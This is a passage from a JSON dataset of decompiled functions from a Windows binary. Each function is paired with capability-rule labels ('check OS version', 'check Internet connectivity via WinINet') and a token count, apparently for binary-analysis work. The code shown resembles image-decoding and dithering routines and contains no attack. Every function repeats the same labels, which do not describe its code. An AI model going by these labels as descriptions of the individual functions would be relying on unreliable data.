+ 0x90 + iVar8 * 4;\n            for (iVar8 = 1 << (uVar5 & 0x1f); 0 < iVar8; iVar8 = iVar8 + -1) {\n                *piVar6 = iVar2;\n                piVar6 = piVar6 + 1;\n                *puVar7 = *var_30h;\n                puVar7 = puVar7 + 1;\n            }\n            var_28h = var_28h + 1;\n            var_30h = var_30h + 1;\n            var_14h = var_14h + 1;\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 9);\n    if (var_8h != 0) {\n        var_18h = 0;\n        var_20h = var_ch + 0x11;\n        if (0 < var_1ch) {\n            do {\n                if (0xf < *var_20h) {\n                    *(*var_4h + 0x14) = 8;\n                    (***var_4h)();\n                }\n                var_18h = var_18h + 1;\n                var_20h = var_20h + 1;\n            } while (var_18h < var_1ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 1692
    },
    "004361ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004361ac(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t **in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *in_ECX;\n    uint8_t *in_EDX;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint var_10h;\n    uint8_t *var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    puVar4 = *in_EAX;\n    puVar5 = in_EAX[1];\n    piVar1 = in_EAX[4];\n    var_ch = in_ECX;\n    var_8h = in_EDX;\n    if (piVar1[0x68] == 0) {\n        if (in_ECX < 0x19) {\n            do {\n                if (puVar5 == NULL) {\n                    iVar2 = (**(piVar1[6] + 0xc))();\n                    if (iVar2 == 0) {\n                        return 0;\n                    }\n                    puVar4 = *piVar1[6];\n                    puVar5 = piVar1[6][1];\n                }\n                puVar5 = puVar5 + -1;\n                uVar3 = *puVar4;\n                puVar4 = puVar4 + 1;\n                if (uVar3 == 0xff) {\n                    do {\n                        if (puVar5 == NULL) {\n                            iVar2 = (**(piVar1[6] + 0xc))();\n                            if (iVar2 == 0) {\n                                return 0;\n                            }\n                            puVar4 = *piVar1[6];\n                            puVar5 = piVar1[6][1];\n                        }\n                        puVar5 = puVar5 + -1;\n                        uVar3 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (uVar3 == 0xff);\n                    if (uVar3 != 0) {\n                        piVar1[0x68] = uVar3;\n                        goto code_r0x0043627c;\n                    }\n                    uVar3 = 0xff;\n                }\n                var_8h = uVar3 | var_8h << 8;\n                var_ch = var_ch + 8;\n            } while (var_ch < 0x19);\n        }\n    }\n    else {\ncode_r0x0043627c:\n        if (var_ch < arg_8h) {\n            if (*(piVar1[0x6f] + 8) == 0) {\n                *(*piVar1 + 0x14) = 0x75;\n                (**(*piVar1 + 4))();\n                *(piVar1[0x6f] + 8) = 1;\n            }\n            var_8h = var_8h << (0x19U - var_ch & 0x1f);\n            var_ch = 0x19;\n        }\n    }\n    *in_EAX = puVar4;\n    in_EAX[1] = puVar5;\n    in_EAX[2] = var_8h;\n    in_EAX[3] = var_ch;\n    return 1;\n}\n",
        "token_count": 720
    },
    "004363f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004363f0(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    iVar2 = *(in_EAX + 0x1bc);\n    iVar3 = *(iVar2 + 0x10);\n    if (iVar3 < 0) {\n        iVar3 = iVar3 + 7;\n    }\n    piVar1 = *(in_EAX + 0x1b8) + 0x18;\n    *piVar1 = *piVar1 + (iVar3 >> 3);\n    *(iVar2 + 0x10) = 0;\n    iVar3 = (**(*(in_EAX + 0x1b8) + 8))();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    puVar4 = iVar2 + 0x14;\n    for (iVar3 = 0; iVar3 < *(in_EAX + 0x148); iVar3 = iVar3 + 1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar2 + 0x24) = *(in_EAX + 0x114);\n    if (*(in_EAX + 0x1a0) == 0) {\n        *(iVar2 + 8) = 0;\n    }\n    return 1;\n}\n",
        "token_count": 323
    },
    "004369d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004369d0(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    if (*(iVar1 + 0x24) == 0) {\n        uVar3 = 2;\n        if (*(iVar1 + 0x2c) < 2) {\n            uVar3 = *(iVar1 + 0x2c);\n        }\n        iVar2 = *arg_ch;\n        if (arg_8h - iVar2 < uVar3) {\n            uVar3 = arg_8h - iVar2;\n        }\n        var_14h = *(arg_10h + iVar2 * 4);\n        if (uVar3 < 2) {\n            var_10h = *(iVar1 + 0x20);\n            *(iVar1 + 0x24) = 1;\n        }\n        else {\n            var_10h = *(arg_10h + 4 + iVar2 * 4);\n        }\n        (**(iVar1 + 0xc))(&var_14h);\n    }\n    else {\n        fcn.0043e4e0(*(iVar1 + 0x28), 1, 0);\n        uVar3 = 1;\n        *(iVar1 + 0x24) = 0;\n    }\n    *arg_ch = *arg_ch + uVar3;\n    *(iVar1 + 0x2c) = *(iVar1 + 0x2c) - uVar3;\n    if (*(iVar1 + 0x24) == 0) {\n        *var_ch = *var_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "004372cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004372cc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x72] = puVar2;\n    *puVar2 = 0x4372c8;\n    iVar1 = in_EAX[10];\n    uVar3 = iVar1 - 1;\n    if (uVar3 == 0) {\n        if (in_EAX[9] != 1) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else {\n        uVar3 = iVar1 - 4;\n        if (iVar1 - 2U < 2) {\n            if (in_EAX[9] != 3) {\n                *(*in_EAX + 0x14) = 10;\n                uVar3 = (***in_EAX)();\n            }\n        }\n        else {\n            bVar4 = uVar3 < 2;\n            uVar3 = iVar1 - 6;\n            if (bVar4) {\n                if (in_EAX[9] != 4) {\n                    *(*in_EAX + 0x14) = 10;\n                    uVar3 = (***in_EAX)();\n                }\n            }\n            else if (in_EAX[9] < 1) {\n                *(*in_EAX + 0x14) = 10;\n                uVar3 = (***in_EAX)();\n            }\n        }\n    }\n    iVar1 = in_EAX[0xb];\n    if (iVar1 == 1) {\n        in_EAX[0x1e] = 1;\n        if ((in_EAX[10] == 1) || (in_EAX[10] == 3)) {\n            puVar2[1] = fcn.00437120;\n            for (uVar3 = 1; uVar3 < in_EAX[9]; uVar3 = uVar3 + 1) {\n                *(in_EAX[0x36] + 0x30 + uVar3 * 0x54) = 0;\n            }\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (iVar1 == 2) {\n        in_EAX[0x1e] = 3;\n        if (in_EAX[10] == 3) {\n            puVar2[1] = fcn.00436fa8;\n            uVar3 = fcn.00436ef0();\n        }\n        else if (in_EAX[10] == 1) {\n            puVar2[1] = fcn.00437140;\n        }\n        else if (in_EAX[10] == 2) {\n            puVar2[1] = fcn.004370b0;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (iVar1 == 4) {\n        in_EAX[0x1e] = 4;\n        if (in_EAX[10] == 5) {\n            puVar2[1] = fcn.00437188;\n            uVar3 = fcn.00436ef0();\n        }\n        else if (in_EAX[10] == 4) {\n            puVar2[1] = fcn.004370b0;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else if (in_EAX[0xb] == in_EAX[10]) {\n        uVar3 = in_EAX[9];\n        in_EAX[0x1e] = uVar3;\n        puVar2[1] = fcn.004370b0;\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n    }\n    if (in_EAX[0x15] == 0) {\n        in_EAX[0x1f] = in_EAX[0x1e];\n        return uVar3;\n    }\n    in_EAX[0x1f] = 1;\n    return uVar3;\n}\n",
        "token_count": 1013
    },
    "00437498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00437498(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piStack16;\n    \n    iVar1 = in_EAX[0x1e];\n    iVar2 = in_EAX[0x18];\n    iVar8 = 1;\n    do {\n        iVar6 = iVar8;\n        iVar8 = iVar6 + 1;\n        iVar7 = 1;\n        iVar4 = iVar8;\n        if (1 < iVar1) {\n            do {\n                iVar4 = iVar4 * iVar8;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar1);\n        }\n    } while (iVar4 <= iVar2);\n    if (iVar6 < 2) {\n        iVar8 = *in_EAX;\n        *(iVar8 + 0x14) = 0x38;\n        *(iVar8 + 0x18) = iVar4;\n        (***in_EAX)();\n    }\n    iVar8 = 1;\n    iVar4 = 0;\n    piVar5 = param_2;\n    if (0 < iVar1) {\n        do {\n            *piVar5 = iVar6;\n            iVar8 = iVar8 * iVar6;\n            iVar4 = iVar4 + 1;\n            piVar5 = piVar5 + 1;\n        } while (iVar4 < iVar1);\n    }\n    do {\n        bVar3 = false;\n        iVar4 = 0;\n        piStack16 = 0x4a23e4;\n        if (0 < iVar1) {\n            do {\n                iVar7 = iVar4;\n                if (in_EAX[0xb] == 2) {\n                    iVar7 = *piStack16;\n                }\n                iVar6 = (iVar8 / param_2[iVar7]) * (param_2[iVar7] + 1);\n                if (iVar6 - iVar2 != 0 && iVar2 <= iVar6) break;\n                iVar4 = iVar4 + 1;\n                param_2[iVar7] = param_2[iVar7] + 1;\n                bVar3 = true;\n                piStack16 = piStack16 + 1;\n                iVar8 = iVar6;\n            } while (iVar4 < iVar1);\n        }\n        if (!bVar3) {\n            return iVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 578
    },
    "0043778c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043778c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    char cVar8;\n    int32_t iVar9;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t *piStack24;\n    char *pcStack20;\n    \n    if (*(in_EAX + 0x58) == 1) {\n        *(*(in_EAX + 0x1cc) + 0x1c) = 1;\n    }\n    else {\n        *(*(in_EAX + 0x1cc) + 0x1c) = 0;\n    }\n    iVar2 = *(in_EAX + 0x78);\n    uVar4 = (**(*(in_EAX + 4) + 8))();\n    *(in_EAX + 0x18) = uVar4;\n    iStack32 = *(in_EAX + 0x14);\n    piStack24 = in_EAX + 0x20;\n    for (iVar9 = 0; iVar9 < *(iVar2 + 0x78); iVar9 = iVar9 + 1) {\n        iVar5 = *piStack24;\n        iStack32 = iStack32 / iVar5;\n        if (iStack28 != 0) {\n            piVar1 = *(in_EAX + 0x18) + iVar9 * 4;\n            *piVar1 = *piVar1 + 0xff;\n        }\n        cVar8 = '\\0';\n        puVar3 = *(*(in_EAX + 0x18) + iVar9 * 4);\n        iVar5 = fcn.004375b4(iVar5 + -1);\n        iVar7 = 0;\n        do {\n            while (iVar5 < iVar7) {\n                cVar8 = cVar8 + '\\x01';\n                iVar5 = fcn.004375b4(puVar3 + -1);\n            }\n            *pcStack20 = cVar8 * iStack32;\n            iVar7 = iVar7 + 1;\n            pcStack20 = pcStack20 + 1;\n        } while (iVar7 < 0x100);\n        if (iStack28 != 0) {\n            iVar5 = 1;\n            puVar6 = puVar3 + 0x100;\n            do {\n                iVar7 = -iVar5;\n                iVar5 = iVar5 + 1;\n                puVar3[iVar7] = *puVar3;\n                *puVar6 = puVar3[0xff];\n                puVar6 = puVar6 + 1;\n            } while (iVar5 < 0x100);\n        }\n        piStack24 = in_EAX + 4;\n    }\n    return;\n}\n",
        "token_count": 642
    },
    "00437a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437a04(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    int32_t *piVar8;\n    char **in_ECX;\n    uint8_t *puVar9;\n    uint8_t **in_EDX;\n    int32_t iVar10;\n    char cVar11;\n    char **var_20h;\n    uint8_t **var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    iVar4 = *(in_EAX + 0x78);\n    var_ch = 0;\n    var_20h = in_ECX;\n    var_1ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar9 = *var_1ch;\n            pcVar5 = *var_20h;\n            for (iVar7 = iVar3; iVar7 != 0; iVar7 = iVar7 + -1) {\n                cVar11 = '\\0';\n                iVar10 = 0;\n                piVar8 = piVar2;\n                if (0 < iVar4) {\n                    do {\n                        iVar6 = *piVar8;\n                        uVar1 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        piVar8 = piVar8 + 1;\n                        iVar10 = iVar10 + 1;\n                        cVar11 = cVar11 + *(iVar6 + uVar1);\n                    } while (iVar10 < iVar4);\n                }\n                *pcVar5 = cVar11;\n                pcVar5 = pcVar5 + 1;\n            }\n            var_ch = var_ch + 1;\n            var_20h = var_20h + 1;\n            var_1ch = var_1ch + 1;\n        } while (var_ch < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 525
    },
    "00437c4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437c4c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t in_EAX;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    char **in_ECX;\n    uint8_t **in_EDX;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    char **var_34h;\n    uint8_t **var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = *(in_EAX + 0x1cc);\n    piVar6 = *(iVar5 + 0x18);\n    iVar7 = *piVar6;\n    iVar8 = piVar6[1];\n    iVar9 = piVar6[2];\n    iVar10 = *(in_EAX + 0x70);\n    var_24h = 0;\n    var_34h = in_ECX;\n    var_30h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            iVar11 = *(iVar5 + 0x30);\n            pcVar21 = *var_34h;\n            iVar12 = *(iVar5 + 0x34);\n            iVar19 = iVar11 * 0x40;\n            puVar18 = *var_30h;\n            iVar13 = *(iVar5 + 0x38);\n            iVar14 = *(iVar5 + 0x3c);\n            uVar20 = 0;\n            for (iVar15 = iVar10; iVar15 != 0; iVar15 = iVar15 + -1) {\n                uVar4 = *puVar18;\n                puVar16 = puVar18 + 1;\n                iVar1 = uVar20 * 4;\n                puVar17 = puVar18 + 2;\n                iVar2 = uVar20 * 4;\n                puVar18 = puVar18 + 3;\n                iVar3 = uVar20 * 4;\n                uVar20 = uVar20 + 1 & 0xf;\n                *pcVar21 = *(iVar7 + uVar4 + *(iVar12 + iVar19 + iVar1)) +\n                           *(iVar8 + *puVar16 + *(iVar13 + iVar19 + iVar2)) +\n                           *(iVar9 + *puVar17 + *(iVar14 + iVar19 + iVar3));\n                pcVar21 = pcVar21 + 1;\n            }\n            *(iVar5 + 0x30) = iVar11 + 1U & 0xf;\n            var_24h = var_24h + 1;\n            var_34h = var_34h + 1;\n            var_30h = var_30h + 1;\n        } while (var_24h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 792
    },
    "00437d64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00437d64(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    char **in_ECX;\n    int16_t *piVar12;\n    int32_t *in_EDX;\n    int32_t iVar13;\n    int32_t *var_50h;\n    int16_t **var_4ch;\n    uint var_48h;\n    uint var_44h;\n    char **var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char *var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = *(in_EAX + 0x1cc);\n    iVar3 = *(in_EAX + 0x78);\n    iVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    var_30h = 0;\n    var_50h = in_EDX;\n    var_40h = in_ECX;\n    if (0 < arg_8h) {\n        do {\n            fcn.0043e53c();\n            var_2ch = 0;\n            var_4ch = iVar2 + 0x44;\n            if (0 < iVar3) {\n                do {\n                    var_14h = *var_50h + var_2ch;\n                    var_18h = *var_40h;\n                    if (*(iVar2 + 0x54) == 0) {\n                        iVar13 = 1;\n                        piVar12 = *var_4ch;\n                        var_28h = iVar3;\n                    }\n                    else {\n                        iVar13 = -1;\n                        var_14h = var_14h + (iVar4 + -1) * iVar3;\n                        var_18h = var_18h + iVar4 + -1;\n                        piVar12 = *var_4ch + iVar4 + 1;\n                        var_28h = -iVar3;\n                    }\n                    iVar6 = *(*(iVar2 + 0x18) + var_2ch * 4);\n                    iVar7 = *(*(iVar2 + 0x10) + var_2ch * 4);\n                    iVar9 = 0;\n                    var_ch = 0;\n                    var_8h = 0;\n                    for (iVar8 = iVar4; iVar8 != 0; iVar8 = iVar8 + -1) {\n                        uVar10 = *(iVar5 + (iVar9 + piVar12[iVar13] + 8 >> 4) + *var_14h);\n                        uVar1 = *(iVar6 + uVar10);\n                        *var_18h = *var_18h + uVar1;\n                        iVar11 = uVar10 - *(iVar7 + uVar1);\n                        *piVar12 = var_ch + iVar11 * 3;\n                        var_ch = var_8h + iVar11 * 5;\n                        iVar9 = iVar11 * 7;\n                        var_14h = var_14h + var_28h;\n                        var_18h = var_18h + iVar13;\n                        piVar12 = piVar12 + iVar13;\n                        var_8h = iVar11;\n                    }\n                    *piVar12 = var_ch;\n                    var_2ch = var_2ch + 1;\n                    var_4ch = var_4ch + 1;\n                } while (var_2ch < iVar3);\n            }\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) == 0;\n            var_30h = var_30h + 1;\n            var_50h = var_50h + 1;\n            var_40h = var_40h + 1;\n        } while (var_30h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1009
    },
    "00438164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00438164(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    iVar1 = 0;\n    if (0 < param_2) {\n        do {\n            if ((iVar2 < *(in_EAX + 0x1c)) && (0 < *(in_EAX + 0x18))) {\n                iVar2 = *(in_EAX + 0x1c);\n                iVar3 = in_EAX;\n            }\n            iVar1 = iVar1 + 1;\n            in_EAX = in_EAX + 0x20;\n        } while (iVar1 < param_2);\n    }\n    return iVar3;\n}\n",
        "token_count": 189
    },
    "004381b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004381b8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    \n    iVar3 = *(*(in_EAX + 0x1cc) + 0x18);\n    iStack76 = *param_2;\n    iStack72 = param_2[1];\n    iStack68 = param_2[2];\n    iStack64 = param_2[3];\n    iStack60 = param_2[4];\n    iVar8 = param_2[5];\n    if (iStack76 < iStack72) {\n        piVar1 = iVar3 + iStack76 * 4;\n        for (iVar5 = iStack76; iVar7 = iStack68,  iVar5 <= iStack72; iVar5 = iVar5 + 1) {\n            for (; iVar7 <= iStack64; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar7 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        *param_2 = iVar5;\n                        iStack76 = iVar5;\n                        goto code_r0x00438283;\n                    }\n                }\n            }\n            piVar1 = piVar1 + 1;\n        }\n    }\ncode_r0x00438283:\n    if (iStack76 < iStack72) {\n        piVar1 = iVar3 + iStack72 * 4;\n        for (iVar5 = iStack72; iVar7 = iStack68,  iStack76 <= iVar5; iVar5 = iVar5 + -1) {\n            for (; iVar7 <= iStack64; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar7 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[1] = iVar5;\n                        iStack72 = iVar5;\n                        goto code_r0x00438302;\n                    }\n                }\n            }\n            piVar1 = piVar1 + -1;\n        }\n    }\ncode_r0x00438302:\n    iVar5 = iStack68;\n    if (iStack68 < iStack64) {\n        for (; iVar5 <= iStack64; iVar5 = iVar5 + 1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar5 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[2] = iVar5;\n                        iStack68 = iVar5;\n                        goto code_r0x00438377;\n                    }\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x00438377:\n    iVar5 = iStack64;\n    if (iStack68 < iStack64) {\n        for (; iStack68 <= iVar5; iVar5 = iVar5 + -1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iVar5 * 0x40 + iStack60 * 2;\n                for (iVar4 = iStack60; iVar4 <= iVar8; iVar4 = iVar4 + 1) {\n                    iVar2 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    if (iVar2 != 0) {\n                        param_2[3] = iVar5;\n                        iStack64 = iVar5;\n                        goto code_r0x004383ec;\n                    }\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x004383ec:\n    iVar5 = iStack60;\n    if (iStack60 < iVar8) {\n        for (; iVar5 <= iVar8; iVar5 = iVar5 + 1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iStack68 * 0x40 + iVar5 * 2;\n                for (iVar4 = iStack68; iVar4 <= iStack64; iVar4 = iVar4 + 1) {\n                    if (*piVar6 != 0) {\n                        param_2[4] = iVar5;\n                        iStack60 = iVar5;\n                        goto code_r0x0043845b;\n                    }\n                    piVar6 = piVar6 + 0x20;\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x0043845b:\n    iVar5 = iVar8;\n    if (iStack60 < iVar8) {\n        for (; iStack60 <= iVar5; iVar5 = iVar5 + -1) {\n            piVar1 = iVar3 + iStack76 * 4;\n            for (iVar7 = iStack76; iVar7 <= iStack72; iVar7 = iVar7 + 1) {\n                piVar6 = *piVar1 + iStack68 * 0x40 + iVar5 * 2;\n                for (iVar4 = iStack68; iVar4 <= iStack64; iVar4 = iVar4 + 1) {\n                    if (*piVar6 != 0) {\n                        param_2[5] = iVar5;\n                        iVar8 = iVar5;\n                        goto code_r0x004384ca;\n                    }\n                    piVar6 = piVar6 + 0x20;\n                }\n                piVar1 = piVar1 + 1;\n            }\n        }\n    }\ncode_r0x004384ca:\n    iVar4 = (iStack72 - iStack76) * 8;\n    iVar5 = (iVar8 - iStack60) * 0x10;\n    iVar7 = (iStack64 - iStack68) * 0xc;\n    param_2[6] = iVar4 * iVar4 + iVar7 * iVar7 + iVar5 * iVar5;\n    iStack56 = 0;\n    piVar1 = iVar3 + iStack76 * 4;\n    for (; iVar3 = iStack68,  iStack76 <= iStack72; iStack76 = iStack76 + 1) {\n        for (; iVar3 <= iStack64; iVar3 = iVar3 + 1) {\n            piVar6 = *piVar1 + iVar3 * 0x40 + iStack60 * 2;\n            for (iVar5 = iStack60; iVar5 <= iVar8; iVar5 = iVar5 + 1) {\n                if (*piVar6 != 0) {\n                    iStack56 = iStack56 + 1;\n                }\n                piVar6 = piVar6 + 1;\n            }\n        }\n        piVar1 = piVar1 + 1;\n    }\n    param_2[7] = iStack56;\n    return;\n}\n",
        "token_count": 1826
    },
    "00438ac0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
